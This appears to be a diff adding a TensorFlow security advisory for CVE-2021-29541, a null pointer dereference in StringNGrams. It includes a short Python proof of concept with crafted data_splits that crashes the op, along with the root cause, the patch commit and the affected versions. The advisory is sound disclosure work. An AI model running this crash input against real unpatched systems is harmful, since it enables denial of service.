@@ -1,0 +1,38 @@
+<h2>TFSA-2021-030: Null pointer dereference in <code>StringNGrams</code></h2>
+<h3>CVE Number</h3>
+<p>CVE-2021-29541</p>
+<h3>Impact</h3>
+<p>An attacker can trigger a dereference of a null pointer in
+<code>tf.raw_ops.StringNGrams</code>:</p>
+<p>```python
+import tensorflow as tf</p>
+<p>data=tf.constant([''] * 11, shape=[11], dtype=tf.string)</p>
+<p>splits = [0]*115
+splits.append(3)
+data_splits=tf.constant(splits, shape=[116], dtype=tf.int64)</p>
+<p>tf.raw_ops.StringNGrams(data=data, data_splits=data_splits, separator=b'Ss',
+                        ngram_widths=[7,6,11],
+                        left_pad='ABCDE', right_pad=b'ZYXWVU',
+                        pad_width=50, preserve_short_sequences=True)
+```</p>
+<p>This is because the
+<a href="https://github.com/tensorflow/tensorflow/blob/1cdd4da14282210cc759e468d9781741ac7d01bf/tensorflow/core/kernels/string_ngrams_op.cc#L67-L74">implementation</a>
+does not fully validate the <code>data_splits</code> argument. This would result in
+<a href="https://github.com/tensorflow/tensorflow/blob/1cdd4da14282210cc759e468d9781741ac7d01bf/tensorflow/core/kernels/string_ngrams_op.cc#L106-L110"><code>ngrams_data</code></a>
+to be a null pointer when the output would be computed to have 0 or negative
+size.</p>
+<p>Later writes to the output tensor would then cause a null pointer dereference.</p>
+<h3>Patches</h3>
+<p>We have patched the issue in GitHub commit
+<a href="https://github.com/tensorflow/tensorflow/commit/ba424dd8f16f7110eea526a8086f1a155f14f22b">ba424dd8f16f7110eea526a8086f1a155f14f22b</a>.</p>
+<p>The fix will be included in TensorFlow 2.5.0. We will also cherrypick this
+commit on TensorFlow 2.4.2, TensorFlow 2.3.3, TensorFlow 2.2.3 and TensorFlow
+2.1.4, as these are also affected and still in supported range.</p>
+<h3>For more information</h3>
+<p>Please consult <a href="https://github.com/tensorflow/tensorflow/blob/master/SECURITY.md">our security
+guide</a> for
+more information regarding the security model and how to contact us with issues
+and questions.</p>
+<h3>Attribution</h3>
+<p>This vulnerability has been reported by Yakun Zhang and Ying Wang of Baidu
+X-Team.</p>
